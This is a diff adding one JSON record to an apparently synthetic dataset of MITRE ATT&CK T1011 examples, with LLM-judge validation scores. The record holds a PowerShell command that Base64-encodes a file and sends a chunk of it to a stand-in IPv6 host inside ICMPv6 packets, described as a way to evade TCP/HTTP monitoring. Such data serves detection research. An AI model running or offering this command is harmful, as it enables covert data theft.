@@ -1,0 +1,46 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $chunk=$b.Substring(0,[Math]::Min(800,$b.Length)); nping.exe --icmp -6 2001:db8:dead:beef::26 --data-string ('C1:'+ $chunk) -c 1",
+  "explanation": "Sends the first chunk of Base64-encoded data inside an ICMPv6 Echo payload, diverging from typical TCP-based channels and fitting T1011 behavior. Chunk labeling supports multi-packet exfil.",
+  "rationale_steps": [
+    "Create a manageable Base64 chunk with a simple label.",
+    "Transmit via ICMPv6 to avoid standard TCP/HTTP monitoring paths."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-7fdda75d",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell assignments and separators are correct, quoting/parentheses are balanced, and nping flags/arguments (including --icmp, -6, --data-string) are valid and well-formed.",
+        "semantic_score": 4,
+        "semantic_justification": "It base64-encodes a file, extracts an 800-char chunk, and embeds it in an ICMPv6 Echo payload with a 'C1:' label via nping (consistent with T1011), though practical execution may require elevated privileges and the example IPv6 address is a documentation prefix.",
+        "combined_score": 4.5,
+        "confidence": 0.84,
+        "timestamp": "2025-10-01T15:47:22.258558Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with correct Powershell syntax for variable assignments, method calls, string manipulation, and valid nping.exe arguments.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command's design perfectly aligns with T1011 for embedding data in ICMPv6, the stated 'Privilege: None' makes it operationally infeasible on Windows, as nping.exe typically requires administrative rights to craft raw ICMP packets.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T15:47:49.470509Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.5,
+    "llm_average_score": 4.25,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
